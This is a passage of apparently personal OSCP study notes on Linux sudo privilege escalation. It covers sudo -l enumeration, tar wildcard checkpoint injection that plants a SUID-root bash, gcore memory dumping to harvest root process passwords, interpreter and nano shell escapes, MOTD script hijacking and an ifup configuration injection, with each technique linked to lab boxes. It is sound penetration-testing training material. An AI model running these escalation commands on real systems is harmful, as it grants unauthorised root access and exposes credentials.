# Linux - Sudo Check

**Step 14 of 50 · Linux**

*Check whether the current user can run a command as root without a password.*

Fast syntax reference: [[OSCP COMMAND MASTER CHEATSHEET|OSCP Command Master Cheatsheet]] · Use this page to interpret the complete sudo boundary before selecting an escape.

## Run this

> **Why:** This asks sudo which commands the current account may run and whether a password is required, exposing the exact privilege boundary to test.
```bash
sudo -n -l
```

## Example output

NOPASSWD binary:
```
User username may run the following commands on host:
    (ALL) NOPASSWD: /usr/bin/find
```

Full sudo:
```
User username may run the following commands on host:
    (ALL : ALL) ALL
```

Unrestricted passwordless sudo:
```
User username may run the following commands on host:
    (ALL) NOPASSWD: ALL
```
## What did you get?

- [ ] `(ALL) ALL` is shown → **Run `sudo su`, run `id` to confirm UID 0, then go to Step 21 · [[Linux - Clean Down]]**
- [ ] `(ALL) NOPASSWD: ALL` is shown → **Run `sudo -n sh -c 'id; whoami; hostname'`, confirm UID 0, then go to Step 21 · [[Linux - Clean Down]]**
- [ ] A specific NOPASSWD binary is shown → **Open the matching GTFOBins entry, copy its SUID or sudo command, run it once, and return here with the resulting identity**
- [ ] `rdiff-backup --server` is allowed with a trailing wildcard → **Go to Step 14A · [[Linux - Rdiff-Backup Sudo Abuse]] and preserve the complete restriction and argument order**
- [ ] A NOPASSWD script path is shown but the file is absent → **Run `ls -la $SudoScriptDir`; if the parent path is writable, run `mkdir -p $SudoScriptDir` and create the approved script, then rerun the exact sudo path**
- [ ] `NOPASSWD: /usr/bin/gcore` is shown → **Run `ps aux | grep root`, set `$Pid` to the target process ID, run `sudo gcore $Pid`, then run `strings core.$Pid | grep -A2 -i "password"`**
- [ ] `NOPASSWD: /usr/bin/tar` with a wildcard `*` argument is shown → **Tar wildcard injection: create `--checkpoint=1`, `--checkpoint-action=exec=sh shell.sh` files in the target directory, then trigger the sudo command**
- [ ] A binary is allowed with a password → **Run `sudo -l`, enter `$Password` when prompted, then open the binary's GTFOBins entry and run its documented sudo command**
- [ ] Nothing useful is shown → **Go to Step 15 · [[Linux - SUID Check]]**

## Notes

GTFOBins documents ways to turn some allowed programs into a root shell.

For tar wildcard injection: the filenames are interpreted as tar flags when `*` expands. Create the checkpoint files in the working directory the sudo command runs against, then trigger the command.

## Gotcha

> [!warning] 💡
> A sudo rule is only useful if the current user can satisfy its password requirement or it is NOPASSWD.

> [!warning] 💡
> `gcore` dumps process memory to a file named `core.<PID>`. Use `strings` piped through `grep` for `Password`, `pass`, and `secret` — service accounts that auto-login often have cleartext credentials in memory.

> [!warning] 💡
> A sudoers entry can reference a file that is not currently present. Check the entire path before looking for an overwrite primitive; when the directory is writable, creating the missing script is the shorter path.

## Run-as user transition

Some sudo rules grant a shell as another unprivileged account rather than root. Treat that account as a deliberate pivot: record the exact rule, switch with the permitted command, then repeat local enumeration as the new user.

> **Why:** This command uses the allowed run-as identity and opens an interactive shell for a fresh ownership and scheduled-task check.
```bash
sudo -u $Username2 /bin/bash -i
id
whoami
```

## Tar wildcard checkpoint injection

Use this branch when `sudo -l` shows a privileged `tar` command whose arguments contain an unquoted `*`. When the shell expands the wildcard, filenames beginning with `--` become tar options, including a checkpoint action that runs a script.

> **Why:** These commands create tar-option filenames and a shell payload in the directory the privileged job archives; look for the payload to run when tar reaches its checkpoint.
```bash
# The filenames become tar flags when the privileged wildcard expands.
printf '' > '--checkpoint=1'
printf '' > '--checkpoint-action=exec=sh shell.sh'
printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\n' > shell.sh
chmod +x shell.sh
```

> **Why:** This is the exact privileged archive command that expands the crafted filenames; success is a SUID-root `/tmp/rootbash` or another controlled proof of execution.
```bash
# Run the command exactly as shown by sudo -l, changing only its approved archive path.
sudo tar -czvf /tmp/backup.tar.gz *
ls -l /tmp/rootbash
```

## gcore memory-dump path

`gcore` creates a file containing a running process’s memory. If sudo allows it against a root-owned process, search the dump for service credentials instead of assuming the rule directly gives a shell.

> **Why:** This command finds a root process and dumps its memory with the permitted binary; use the resulting core file as private loot.
```bash
# Pick a relevant root-owned process ID from the first command’s output.
ps aux | grep '[r]oot'
sudo gcore $Pid
```

> **Why:** `strings` extracts readable text and `grep` filters likely credential terms; look for service-account names or password fields, then validate any candidate.
```bash
strings core.$Pid | grep -Ei 'password|pass|cred|secret'
```

## Additional routing

- [ ] Tar creates a SUID-root helper → **Run `/tmp/rootbash -p`, run `id` and `whoami` to confirm UID 0, then remove the checkpoint filenames and helper**
- [ ] `gcore` reveals a candidate credential → **Store it privately and validate it through the relevant credential stage**
- [ ] Neither path applies → **Continue to Step 15 · [[Linux - SUID Check]]**

## Interpreter or embedded-code runner

When `sudo -l` permits a scripting interpreter as another user, inspect its help output for inline evaluation. A permitted interpreter is often an indirect command-execution primitive even when Bash is not explicitly allowed.

> **Why:** `-e` evaluates Lua code, and `os.execute()` passes the command to the operating system with the run-as identity granted by sudo.
```bash
sudo -u $Username2 $AllowedInterpreter --help
sudo -u $Username2 $AllowedInterpreter -e 'os.execute("id")'
```

For Luvit/Lua:

```bash
sudo -u $Username2 /home/sysadmin/luvit -e 'os.execute("id")'
sudo -u $Username2 /home/sysadmin/luvit -e 'os.execute("whoami")'
```

> [!warning] 💡
> Do not substitute `/bin/bash` for the permitted interpreter. Sudo checks the executable and arguments. Use the allowed interpreter's own command-execution feature, prove the new identity with `id`, and then repeat local enumeration as that user.

## Login-triggered scripts and MOTD permissions

After an interpreter pivot, inspect scripts that execute during login or connection setup. Ubuntu's `/etc/update-motd.d/` scripts run when SSH builds the login message. A root-owned script that is writable by the current user or group is a privileged execution path.

> **Why:** These checks connect ownership, group write permission, and the event that triggers execution before a payload is written.
```bash
ls -la /etc/update-motd.d/
stat -c '%U:%G %A %n' /etc/update-motd.d/* 2>/dev/null
grep -RniE 'update-motd|motd|ssh' /etc/ssh /etc/update-motd.d 2>/dev/null
```

If the file is writable through the current run-as identity, preserve it first and use a controlled marker or SUID helper only in an authorised lab:

```bash
sudo -u "$Username2" "$AllowedInterpreter" -e \
  "os.execute(\"cp /etc/update-motd.d/00-header /home/$Username2/00-header.bak\")"
```

Trigger the event with a fresh authenticated SSH connection, then verify the side effect. For a SUID Bash helper:

```bash
ssh $Username@$BoxIP 'true'
ls -la /tmp/rootbash
/tmp/rootbash -p -c 'id && whoami'
```

> [!warning] 💡
> Editing a login script does not execute it immediately. Trigger the documented event, verify the output artifact, and restore the original script before closing the box.

## Sudo-allowed configuration generators

When `sudo -l` exposes a script rather than a standard GTFOBins binary, read the script and every helper it invokes. Pay special attention when it writes a configuration file and immediately calls a privileged service that sources that file. Validate the input character class, quoting, separators, and whether spaces are accepted.

```bash
sudo -n -l
sed -n '1,240p' $SudoScript
grep -RniE 'source|\. |ifup|ifdown|systemctl|service|eval|exec|echo.*\$' $SudoScript /usr/local/sbin 2>/dev/null
```

If a value is written as a configuration assignment and later interpreted by a root helper, test only the documented input path with a benign command-bearing value. Confirm `id` and `whoami`, then remove the generated configuration before leaving the box.

For a script that prompts for `NAME`, `PROXY_METHOD`, `BROWSER_ONLY`, and `BOOTPROTO`, the Networked-style proof input was:

```text
x
x
x
dhcp /bin/bash
```

Use this exact pattern only after source review confirms the generated configuration is sourced by a privileged `ifup`-style helper.

> [!warning] 💡
> A regular expression that allows spaces is not shell-safe validation. The danger comes from the later parser or `source` operation, not necessarily from the assignment-writing script itself.
## Nano command escape

When sudo permits `/bin/nano` on a file, nano's command prompt can execute a shell with the permitted privilege. This requires a proper interactive TTY so the control-key sequence is delivered to nano.

> **Why:** The command starts the exact permitted editor, then the nano shortcuts switch to its execute-command prompt and launch a shell.
```bash
sudo /bin/nano $SudoFile
# Press Ctrl+R, then Ctrl+X
# Enter: reset; sh 1>&0 2>&0
# Press Enter, then run id and whoami
```

> [!warning] 💡
> If the terminal is garbled or the shortcuts do not register, restore the TTY with `reset` and retry the exact sequence.

**Reference:** [GTFOBins nano](https://gtfobins.github.io/gtfobins/nano/#sudo)
## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- notch had password-authenticated (ALL : ALL) ALL; the recovered password plus sudo -i completed escalation
- [[OSCP/BOXES/WRITE UPS/Linux/Payday|Payday]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/Pelican|Pelican]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/Nukem|Nukem]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/Cockpit|Cockpit]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- created a missing sudo-allowed script and used it to plant SUID Bash
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- passwordless sudo nano yielded a root shell through the command escape
- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- passwordless sudo transition from `www-data` to `scriptmanager`
- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- passwordless sudo transition from `www-data` to `pepper`
- [[OSCP/BOXES/WRITE UPS/Linux/SwagShop|SwagShop]] -- passwordless Vim sudo rule yielded a root shell escape
- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- passwordless sudo `changename.sh` led to an `ifup` configuration injection
- [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- passwordless sudo `/bin/tar` used the checkpoint action to become `onuma`
- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- argument-specific `journalctl` permission opened a pager and a root shell
- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- passwordless sudo to Luvit enabled Lua `os.execute()` as another user
- [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] -- passwordless sudo to Chef Knife enabled Ruby `exec` and a root shell
- [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- `pi` had unrestricted `NOPASSWD: ALL`, so a direct sudo identity proof completed escalation
- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- a wildcard after the rdiff-backup server restrictions allowed a duplicate root path and read-only root mirror
- [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- sudo -l yielded no route; capability enumeration became decisive

## Chef Knife Ruby evaluation

Use this branch when `sudo -l` permits `/usr/bin/knife` as root without a password. Knife's `exec -E` option evaluates Ruby code, and Ruby's `exec` replaces the current process without dropping the root identity acquired through sudo.

```bash
sudo -l
command -v knife
knife --version
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
id
whoami
```

> [!warning] 💡
> Use the exact path shown by `sudo -l`. First prove the result with `id`; then record the root proof privately and continue to [[Linux - Clean Down]].

**Reference:** [GTFOBins Knife](https://gtfobins.org/gtfobins/knife/)

## Perl interpreter escape

When sudo allows the exact Perl interpreter without a password, use inline evaluation and process replacement. Confirm the rule first and prove the identity after execution.

~~~bash
sudo -n -l
sudo /usr/bin/perl -e 'exec "/bin/bash";'
id
whoami
~~~

> **Why:** The sudo rule grants the Perl process a privileged identity. Perl's exec replaces that process with Bash, so the shell inherits the identity already granted by sudo.

## Rdiff-backup server restriction branch

When the exact sudo rule permits `rdiff-backup --server` with a trailing `*`, do not treat it as an ordinary GTFOBins binary. Read the fixed arguments, test duplicate `--restrict-path` behaviour, and follow [[Linux - Rdiff-Backup Sudo Abuse]] for the protocol-aware read-only proof.

## Shocker example

- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- shelly used the exact NOPASSWD /usr/bin/perl rule to launch Bash as root

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
